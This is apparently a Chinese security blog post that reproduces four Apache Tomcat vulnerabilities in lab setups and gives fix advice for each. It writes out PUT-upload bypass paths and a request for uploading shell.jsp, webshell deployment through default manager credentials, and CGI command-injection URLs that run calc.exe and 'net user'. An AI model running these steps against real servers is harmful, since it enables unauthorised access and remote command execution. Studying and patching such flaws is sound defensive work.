#  中间件安全|Tomcat漏洞汇总   
原创 Cyb3rES3c  Cyb3rES3c   2025-01-20 02:08  
  
**0x0****声明**  
  
    由于传播、利用此文所提供的信息而造成的任何直接或间接的后果和损失，均由使用者本人承担，Cyb3rES3c及文章作者不承担任何责任。如有侵权烦请告知，我们将立即删除相关内容并致歉。请遵守《中华人民共和国个人信息保护法》、《中华人民共和国网络安全法》等相关法律法规。  
  
**0x1 Tomcat概述**  
  
  
    Tomcat是一个开源而且免费的isp服务器，默认端口是8080，属于轻量级应用服务器。它可以实现JavaWeb程序的装载，是配置JSP(Java Server Page)和JAVA系统必备的一款环境。  
  
**0x****2 CVE-2017-12615 PUT文件上传**  
  
漏洞描述  
  
    当Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法(例如，将readonly初始化参数由默认值设置为false)，攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。  
  
    当在Tomcat的conf(配置目录下)/web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生，(需要允许put请求)，攻击者可以利用PUT方法通过精心构造的数据包向存在漏洞的服务器里面上传 jsp一句话文件，从而造成远程命令执行、Getshell等。  
  
影响范围  
```
Apache Tomcat 7.0.0-7.0.79
Apache Tomcat 8.5.19
```  
  
环境搭建  
```
cd vulhub/tomcat/CVE-2017-12615
docker-compose up -d
```  
  
可以看到 readonly 的值被设置为 false  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYufzMMA1TI9X1vWYKO81mfD5tYBX3ShP9GHuPfbbZ38uz7o5o2PmdOQ/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现  
  
访问Web服务 http://192.168.111.128:8080/  
  
在 Title 中可以看到 Tomcat 版本号：8.5.19，存在 PUT 文件上传漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYsHIXMpHiabJwVKyDCfWCia2Dl42VnkU1HCGXuwvwGkw1hZ1keJnypibIg/640?wx_fmt=png&from=appmsg "")  
  
默认使用 PUT <filename>.jsp 是失败的，需要 bypass，下面是三种 bypass 方法  
```
PUT /<filename>.jsp/
PUT /<filename>.jsp%20
PUT /<filename>.jsp::$DATA
```  
  
手工利用需要请求两次，第一次请求，返回 201 状态码，这个请求可以无响应体部分；PUT 再次请求该路径，返回 204 响应，这个过程会更新路径对应的文件。  
```
PUT /shell.jsp/ HTTP/1.1
Host: 192.168.111.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 849
```  
  
第一次请求响应状态码为 201，没有响应体  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYxhG3QX4xCXajfcr2fyPbibWfeEdT8l6WW2f5MgRzTMNhMJVdcVPXs7w/640?wx_fmt=png&from=appmsg "")  
  
  
再次请求，响应体的状态码变成了 204  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYuAygib3WwRiamibCRib5ZQxqzL58pCQiajQkn95EWcr7iaQicSfbib0mGicM1PQ/640?wx_fmt=png&from=appmsg "")  
  
在浏览器中访问时可以看到请求体解析后的内容  
  
注：在浏览器中访问时，请求路径需要将 JSP 文件夹后的过滤字符去掉！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYa6BSYRU09To9voA6LoQx7VZlK9AoVngeDibk22z0ZWSrPQP6xwg5RBw/640?wx_fmt=png&from=appmsg "")  
  
这里就可以证明存在 PUT 文件上传漏洞。  
  
上传 WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYTh1AJWtkS52KKhpG5R4lwXcHbj4eKe6zlWfvp1J5UXic2Qwha1zyFsg/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接 Webshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYJhW3DF2E7YWcxCQB3Vpg2IWfcicFdlibaib3nbdnibia5RbM9vn8sa3O7dA/640?wx_fmt=png&from=appmsg "")  
  
root权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpY7kcgduHEp8BIG2l2AfWibZo8nZhyY28e5q0a1n6Udr9EhJxJ2xhxW9Q/640?wx_fmt=png&from=appmsg "")  
  
  
修复建议  
```
设置 conf/web.xml 文件中 readonly 的值为 true，即不允许执行 DELETE、PUT 操作。
如果业务上不使用 PUT 方法，可以禁用 PUT 方法并重启 Tomcat 服务。
升级 Tomcat 的版本。
```  
  
**0x3****后台弱口令+文件上传**  
  
漏洞描述  
  
    在Tomcat8环境下默认进入后台的密码为 tomcat/tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令。  
  
  
影响范围  
```
全版本
```  
  
环境搭建  
```
cd vulhub/tomcat/tomcat8
docker-compose up -d
```  
  
漏洞复现  
  
访问后台管理地址   
  
http://192.168.111.128:8080/manager/html  
  
tomcat 默认用户名/密码：tomcat/tomcat  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYGHaVEEB2kYX7zrSIPosibjts7VmK6WQBJp7sh8icq1fqibP0Niaghk8kzQ/640?wx_fmt=png&from=appmsg "")  
  
在 WAR file to deploy 中上传文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYIXHZHy7XMtkngqIyMlo31kYpBqJdXv6LZ0GJVupKJI9BiadZ8o9nqLA/640?wx_fmt=png&from=appmsg "")  
  
WebShell 构造流程：将 WebShell 写入 JSP 文件中，压缩为 zip 文件，然后修改 zip 文件后缀名为 .war，上传 .war 文件。  
  
访问 WebShell，访问路径  
```
http://<ip/domain>:8080/<war 文件的文件名（不包含后缀名）>/<webshell 文件名>.jsp
```  
  
http://192.168.111.128:8080/shell/shell.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYpFU2DTgnIGbtcmAoiaPbUMcfwuydjFHUXkXlPbGRrWjJXuMmtARnpqw/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接 WebShell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYXJsSYNDP0DxtELoiazrDHHfiboFEPI2TbCziaD3N2D9hKTbR3l6ACQXhQ/640?wx_fmt=png&from=appmsg "")  
  
  
修复建议  
```
后台管理密码设置为强密码。
部署应用程序时，使用较低权限的用户。
```  
  
**0x4****CVE-2020-1938 任意文件读取**  
  
漏洞描述  
  
    由于Tomcat AJP协议设计上的缺陷，攻击者通过Tomcat AJP Connector 可以读取或包含Tomcat上所 有Webapp⽬录下的任意⽂件，例如： 可以读取webapp配置⽂件或源码⽂件。 此外如果⽬标应⽤有⽂件上传的功能情况下，配合为⽂件包含漏洞利⽤GetShell。  
  
  
影响范围  
```
Apache Tomcat 6
Apache Tomcat 7 < 7.0.100
Apache Tomcat 8 < 8.5.51
Apache Tomcat 9 < 9.0.31
```  
  
环境搭建  
```
cd vulhub/tomcat/CVE-2020-1938
docker-compose up -d
```  
  
漏洞复现  
  
使用 nmap 扫描发现 AJP 协议  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYFOlGYlohMSmKHwLy7NK5INbYIKANZibuXdJOGibf3ibLzQD1bN5mZ8o7A/640?wx_fmt=png&from=appmsg "")  
  
利用脚本读取WEB-INF/web.xml文件  
  
脚本地址：https://github.com/0nise/CVE-2020-19387  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYjvwc5icTRyxMqcCdoT69EokDIf7w9oUqPbK1bWZBZnntCIhS3JJFmPA/640?wx_fmt=png&from=appmsg "")  
  
修复建议  
```
临时/永久禁用 AJP 协议端口，在 conf/server.xml 配置文件中注释掉：
<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />
配置 AJP 配置中的 secretRequired 和 secret 属性来限制认证。
下载 Tomcat 最新版本。
```  
  
**0x5****CVE-2019-0232**  
  
漏洞描述  
  
    该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。  
  
    该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数，但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。  
  
影响范围  
```
Apache Tomcat 9.0.0.M1 - 9.0.17
Apache Tomcat 8.5.0 - 8.5.39
Apache Tomcat 7.0.0 - 7.0.93
```  
  
环境搭建  
  
vulhub 中没有 CVE-2019-0232 的环境，需要手动配置环境。  
  
环境信息如下：  
  
Windows11  
  
Tomcat 9.0.17  
  
在Tomcat的 conf/web.xml 中找到 CGIServlet 部分，去掉注释  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYvyicmA5tGXdWTR1zWKJicyKT6TTHMewFagXhcialqoePBFckP14Bt8scg/640?wx_fmt=png&from=appmsg "")  
  
然后在 servlet 中添加配置  
```
    <servlet>
        <servlet-name>cgi</servlet-name>
        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
        <init-param>
          <param-name>cgiPathPrefix</param-name>
          <param-value>WEB-INF/cgi-bin</param-value>
        </init-param>
        <init-param>
            <param-name>enableCmdLineArguments</param-name>
            <param-value>true</param-value>
          </init-param>
          <init-param>
              <param-name>executable</param-name>
              <param-value></param-value>
            </init-param>
        <load-on-startup>5</load-on-startup>
    </servlet>
```  
  
需要修改 cgi 的路径，修改后的路径如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpY9l1RhpXEbWRkZDUQSQ9yqopGZWkfOib6nBCxjK5HhZWNE4Q4eqnhEXw/640?wx_fmt=png&from=appmsg "")  
  
然后在 conf/web.xml 中启用 cgi 的 servlet-mapping（删除注释）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYzkI6lIm4D6gRzh9hj2uUV3KAMwS9wlo9xqC5qCKMbfFibGWAqOGT1RA/640?wx_fmt=png&from=appmsg "")  
  
然后在 conf/content.xml 中添加privileged="true"属性，否则没有权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYaRsCvztK1ZQn87z3WCkic1HADhsDTYcPlYGS2vhjTp9mQ3jgIoCAKzA/640?wx_fmt=png&from=appmsg "")  
  
在 \webapps\ROOT\WEB-INF下创建 cgi-bin目录，注意：目录名称一定和 web.xml 文件中的目录名保持一致。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYNFvGmz1VUdBm5WrxT16bOWuBs2un3e5g2zCGM4FCjO66cT0fOewT2A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYQoIQrn5guDo4EYjcepLJsGHARUMHgJhLJOnN8nWb7vY5CSPQsibRX0A/640?wx_fmt=png&from=appmsg "")  
  
在 cgi-bin目录下创建一个 bat 文件  
  
文件内容：1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYBF8SNYRKo2DeQV7vmUXD0BzUomzeSQ0ZIJq2G9GUreA9iatAUd9jUDQ/640?wx_fmt=png&from=appmsg "")  
  
重启 tomcat  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpY8g8tSXpOeLkzRh18j57AibadK6tiaMMkfu3fKgwXVvRP4w3bKQ4kpaoQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
  
虚拟机中访问 tomcat  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYP9DOoTRVVcqsJaFSpaZA45icS2vhqF4Qc5GxvxtuGYpKhonLjzIuPqw/640?wx_fmt=png&from=appmsg "")  
  
访问 bat 文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYaGI1q0Fe4ruq76r7rXos5JEpjMKic00raM0YwBynoziaRU64viaibRjGXA/640?wx_fmt=png&from=appmsg "")  
  
添加参数  
```
?&C%3A%5CWindows%5CSystem32%5Ccalc.exe
```  
  
完整的URL  
```
http://192.168.235.9:8080/cgi-bin/shell.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe
```  
  
访问之后在物理主机 windows11 中启动了计算器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYXVpXT6S04bSf8FT6UnwJFtOmWSiaCb48S8pWKoYibictbngdTe61b53Mg/640?wx_fmt=png&from=appmsg "")  
  
查看账户信息  
```
http://192.168.235.9:8080/cgi-bin/shell.bat?&C%3a%5cWindows%5cSystem32%5Cnet+user
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fo3OZEF1OKrAkJtZEuB8e9gG0HOxbHpYRib14EQm1XmWjaaF3iaU5icLbM4m3aFlMxYcWw8WItupFXLewvvFL01zA/640?wx_fmt=png&from=appmsg "")  
  
修复建议  
```
禁用enableCmdLineArguments参数。
在conf/web.xml中覆写采用更严格的参数合法性检验规则。
升级Tomcat到9.0.17以上版本。
```  
  
如果想要及时了解更多内容，请关注   
Cyb3rES3c  
   
微信公众号！  
  
  
  
